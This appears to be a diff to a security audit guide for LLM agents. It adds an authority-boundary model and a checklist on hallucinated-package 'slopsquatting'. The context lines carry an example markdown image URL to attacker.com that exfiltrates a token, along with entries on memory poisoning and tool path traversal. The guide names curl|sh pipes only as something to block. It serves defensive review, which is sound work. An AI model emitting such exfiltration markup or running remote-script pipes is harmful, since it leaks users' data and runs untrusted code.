@@ -13,6 +13,21 @@ In an LLM/Agentic architecture, the model itself is **untrusted execution logic*
 3. **Model Output as Sinks**: Model output feeding directly into terminal commands, SQL execution, file system modifications, or UI HTML rendering.
 4. **Agent-to-Agent Delegation**: Sub-agents inheriting parent credentials or escalating authority.
 
+### Effective-Authority Boundary Model (Strix Elevation)
+Prompt text is **never** an authorization boundary. Treat the autonomous agent runtime as an inherently confused deputy whose effective authority is bounded by the union of its credentials, tools, resources, network reach, filesystem access, delegated sub-agents, and approval policies:
+
+```text
+User / External Content
+  -> Model Context & Memory (Untrusted Instructions)
+  -> Planner / Router / Policy (Probabilistic Decision Point)
+  -> Tool, MCP Server, or Delegated Sub-Agent (Execution Boundary)
+  -> Credential & Target Infrastructure (Privilege Upper Bound)
+  -> Side Effect / Returned Data Sink (State Change & New Directives)
+```
+
+- **Invariant**: The effective authority exercised by the agent at the execution sink MUST NEVER exceed the least-privileged authority of the calling human user.
+- **Trace Path**: For every tool and MCP bridge, trace credential audience, token scopes, target routing, and argument validation. Ensure model-generated arguments cannot trigger confused deputy privilege escalation or unconstrained network egress.
+
 ---
 
 ## 2. Core Attack Classes & Audit Checklists
@@ -37,6 +52,12 @@ In an LLM/Agentic architecture, the model itself is **untrusted execution logic*
 - [ ] **Markdown Image Exfiltration**: Audit markdown rendering widgets. Block automatic rendering of external images with dynamic URL query parameters (e.g., `![leak](https://attacker.com/log?token=...)`) which leak conversational context via HTTP GET requests.
 - [ ] **Unsanitized HTML in UI Artifacts**: In web-based agent UIs, verify that model-generated HTML/SVG artifacts are sanitized with DOMPurify or equivalent before mounting in the DOM.
 
+### E. Package Hallucination & Supply Chain Slopsquatting (`ORION-LLM-05`)
+- [ ] **Ghost Package Hallucination**: AI hallucinates plausible but non-existent package names during setup (`npm install`, `pip install`, `pub add`, `cargo add`). An attacker registers the hallucinated name ("slopsquatting") to execute malicious install hooks.
+- [ ] **Zero-Day Registration Window**: Inspect package creation timestamps before installation. Packages registered within <14 days present high slopsquatting/typosquatting risk.
+- [ ] **Remote-Code Interpreter Pipes**: Prohibit unverified scripts piped directly into shells (`curl|sh`, `iwr|iex`). Require file persistence, static inspection, or hash verification.
+- [ ] **Non-Hermetic Dependency Drift**: Enforce lockfiles (`npm ci`, `pnpm --frozen-lockfile`, `yarn --immutable`, `dart pub get --enforce-lockfile`) to prevent floating semver resolution of hallucinated transients.
+
 ---
 
 ## 3. Verdict & Remediation Rules
@@ -47,3 +68,4 @@ In an LLM/Agentic architecture, the model itself is **untrusted execution logic*
 | **Markdown Exfiltration** | Proof that chat UI loads external image URLs without proxy or CSP | Strip external image tags or enforce CSP `img-src 'self' data:`. |
 | **Tool Path Traversal** | Proof that model-derived path can escape workspace root | Enforce `os.path.commonpath([workspace, target]) == workspace`. |
 | **Memory Poisoning** | Proof that user input writes uncurated instructions to persistent memory | Enforce schema separation: facts vs instruction invariants. |
+| **Package Hallucination / Slopsquatting** | Command attempts installing unregistered or newly published (<14d) package | Intercept via pre-tool hook with 404 registry query; enforce hermetic lockfile install. |
